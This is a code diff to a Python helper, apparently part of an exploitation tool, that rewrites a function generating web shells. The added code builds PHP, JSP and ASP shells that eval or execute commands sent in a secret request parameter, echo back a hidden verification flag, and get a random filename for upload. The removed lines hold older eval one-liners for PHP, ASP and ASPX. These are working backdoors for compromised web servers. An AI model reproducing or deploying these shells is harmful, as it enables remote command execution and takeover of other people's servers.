@@ -1,5 +1,4 @@
 import hashlib
-import os
 import re
 import json
 import base64 as b64
@@ -109,16 +108,51 @@ def string_split(value) -> list:
 
 def build_web_shell(lang='php') -> tuple:
     # 生成WebShell
-    code, password = '', build_random_str(8)
+    password = build_random_str(8)
+    flag = build_random_str(32)
     if lang == 'php':
-        code = '<?php @eval($_POST["{}"]);?>'.format(password)
-        flag = 'echo "<{}>";die();'.format(password)
+        code = (
+            '<?php'
+            'if(isset($_POST["{password}"])){{'
+            '    @eval($_POST["{password}"]);'
+            '}}else{{'
+            '    echo "<!-- {flag} -->";'
+            '}}'
+            '?>'
+        ).format(password=password, flag=flag)
+    elif lang == 'jsp':
+        code = (
+            '<%@ page import="java.util.*,java.io.*" %>'
+            '<%@ page import="java.io.*"%>'
+            '<%@ page import="java.util.*"%>'
+            '<%'
+            'String cmd = request.getParameter("{password}");'
+            'if (cmd != null && !"".equals(cmd)){{'
+            '    Process p = Runtime.getRuntime().exec(cmd);'
+            '    OutputStream os = p.getOutputStream();'
+            '    InputStream in = p.getInputStream();'
+            '    DataInputStream dis = new DataInputStream(in);'
+            '    String disr = dis.readLine();'
+            '    while ( disr != null)'
+            '    {{'
+            '        out.println(disr);'
+            '        disr = dis.readLine();'
+            '    }}'
+            '}}else{{'
+            '    out.println("<!-- T -->".replace("T","{flag}"));'
+            '}}%>'
+        ).format(password=password, flag=flag)
     elif lang == 'asp':
-        code = '<%eval request("{}")%>'.format(password)
-        flag = 'Response.Write("{}")'.format(password)
-    elif lang == 'aspx':
-        code = '<%@ Page Language="Jscript"%><%eval(Request.Item["{}"],"unsafe");%>'.format(password)
-        flag = 'Response.Write("{}")'.format(password)
+        code = (
+            '<% '
+            'if (request("{password}"))=false then'
+            '    Response.Write("<!-- {flag} -->")'
+            'else'
+            '    eval request("{password}")'
+            'end if '
+            '%>'
+        ).format(password=password, flag=flag)
     else:
-        raise Exception(f'Unusable language {lang}')
-    return code, password, flag
+        raise Exception(f'not found script language : {lang}')
+    name = build_random_str(4) + "." + lang
+    return name, password, code, flag
